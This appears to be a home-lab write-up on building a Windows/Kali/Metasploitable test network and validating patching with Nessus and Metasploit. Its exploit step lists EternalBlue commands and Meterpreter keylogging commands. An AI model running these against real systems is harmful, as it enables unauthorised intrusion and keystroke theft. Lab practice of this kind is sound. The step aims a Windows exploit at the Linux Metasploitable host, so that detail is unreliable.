# 🛠️ Home‑Lab Setup & Exploit Testing
Spin up a Windows + Linux playground, wire it for remote access, then unleash Nessus and Metasploit to prove your patch management actually works.

---

## What I built

| Host | OS / Role | Why it’s here |
|------|-----------|---------------|
| 🖥️ Desktop | **Windows 11** | Primary console + VMware Workstation Pro |
| 🐑 VM 1 | **Metasploitable 2** | Target‑rich environment for exploits |
| 🏢 VM 2 | **Windows Server (DC)** | Domain Controller + RDP test bed |
| 💻 Laptop | **Kali Linux** | Attack box running Nessus & Metasploit |

*Networking:* switched from **NAT → Bridged** to give every VM a routable IP for real‑world reachability.

---

## Key steps (TL;DR)

1. **Platform prep**  
   - Upgrade host to Win 11 → install VMware Pro  
   - Wipe HP laptop → fresh Kali install  

2. **VM deployment**  
   - Import Metasploitable & Server 2019 ISOs  
   - Enable RDP on DC; patch nothing (on purpose)

3. **Networking fix**  
   - Bridged adapters → no more port‑forward headaches  
   - Static IPs + inventory table in `ip-list.md`

4. **Port forwarding (when remote)**  
   ```txt
   Host Port 45001 → 3389 → Domain Controller  
   Host Port 45002 → 22   → Metasploitable
   ```  
   ```bash
   rdesktop <host_ip>:45001   # From Kali
   ```

5. **Exploit demo**  
   ```bash
   msfconsole
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS <Metasploitable IP>
   run
   meterpreter > keyscan_start
   # ...type in Notepad on victim...
   meterpreter > keyscan_dump
   ```

6. **Scan & validate**  
   - Nessus scan confirms MS17‑010  
   - Metasploit shell proves exploitability  
   - Document vulnerabilities + remediation plan

---

## Why this matters

- **Lab first, theory second** – you can’t secure what you can’t reach.  
- **Bridged ≠ NAT** – proper IPs make remote scans and RDP a breeze.  
- **Repeatable script** – next run will take minutes, not hours.

---

## What to try next

- Script the entire build with PowerShell + Bash.  
- Drop in a **honeypot** VM for attacker telemetry.  
- Layer Grafana + Prometheus for live monitoring.  
- Patch the DC, rerun Nessus, prove the vuln is gone.

---

## Lessons learned

> *“If you track every IP and write down every mistake, the exploit demo works on the first try—on stage, under pressure.”*
